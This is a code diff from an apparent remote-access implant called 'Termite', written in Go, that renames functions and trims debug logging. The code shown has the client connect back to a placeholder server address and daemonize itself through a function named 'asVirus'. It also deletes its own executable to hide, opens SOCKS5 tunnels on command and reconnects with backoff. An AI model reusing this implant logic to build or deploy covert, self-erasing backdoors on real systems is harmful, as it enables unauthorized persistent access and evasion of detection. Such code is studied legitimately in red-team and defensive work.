@@ -502,7 +502,7 @@ func handleConnection(c *client) {
 				log.Debug("No such tunnel (PUSH_TUNNEL_DATA): %s", token)
 			}
 		case message.DYNAMIC_TUNNEL_CREATE:
-			port, err := StartSocks5Server()
+			port, err := startSocks5Server()
 			if err != nil {
 				c.EncoderLock.Lock()
 				c.Encoder.Encode(message.Message{
@@ -523,9 +523,9 @@ func handleConnection(c *client) {
 				c.EncoderLock.Unlock()
 			}
 		case message.DYNAMIC_TUNNEL_DESTROY:
-			err := StopSocks5Server()
+			err := stopSocks5Server()
 			if err != nil {
-				log.Error("StopSocks5Server() failed: %s", err.Error())
+				log.Error("stopSocks5Server() failed: %s", err.Error())
 				c.EncoderLock.Lock()
 				c.Encoder.Encode(message.Message{
 					Type: message.DYNAMIC_TUNNEL_DESTROY_FAILED,
@@ -686,7 +686,7 @@ func handleConnection(c *client) {
 	}
 }
 
-func StartSocks5Server() (int, error) {
+func startSocks5Server() (int, error) {
 	// Generate random port
 	port, err := freeport.GetFreePort()
 	if err != nil {
@@ -710,11 +710,11 @@ func StartSocks5Server() (int, error) {
 	return port, nil
 }
 
-func StopSocks5Server() error {
+func stopSocks5Server() error {
 	return (*socks5ServerListener).Close()
 }
 
-func StartClient(service string) bool {
+func startClient(service string) bool {
 	needRetry := true
 	certBuilder := new(strings.Builder)
 	keyBuilder := new(strings.Builder)
@@ -744,8 +744,6 @@ func StartClient(service string) bool {
 			x509.MarshalPKIXPublicKey(v.PublicKey)
 		}
 
-		log.Debug("client: handshake: %v", state.HandshakeComplete)
-		log.Debug("client: mutual: %v", state.NegotiatedProtocolIsMutual)
 		log.Success("Secure connection established on %s", conn.RemoteAddr())
 
 		c := &client{
@@ -758,17 +756,16 @@ func StartClient(service string) bool {
 		}
 		handleConnection(c)
 		return needRetry
-	} else {
-		return !needRetry
 	}
+	return !needRetry
 }
 
-func RemoveSelfExecutable() {
+func removeSelfExecutable() {
 	filename, _ := filepath.Abs(os.Args[0])
 	os.Remove(filename)
 }
 
-func AsVirus() {
+func asVirus() {
 	cntxt := &daemon.Context{
 		WorkDir: "/",
 		Umask:   027,
@@ -784,7 +781,7 @@ func AsVirus() {
 	}
 	defer cntxt.Release()
 	log.Success("daemon started")
-	RemoveSelfExecutable()
+	removeSelfExecutable()
 }
 
 func main() {
@@ -793,7 +790,7 @@ func main() {
 
 	if release {
 		service = strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
-		AsVirus()
+		asVirus()
 	}
 
 	message.RegisterGob()
@@ -804,7 +801,7 @@ func main() {
 
 	for {
 		log.Info("Termite (v%s) starting...", update.Version)
-		if StartClient(service) {
+		if startClient(service) {
 			add := (int64(rand.Uint64()) % backoff.Current)
 			log.Error("Connect to server failed, sleeping for %d seconds", backoff.Current+add)
 			backoff.Sleep(add)
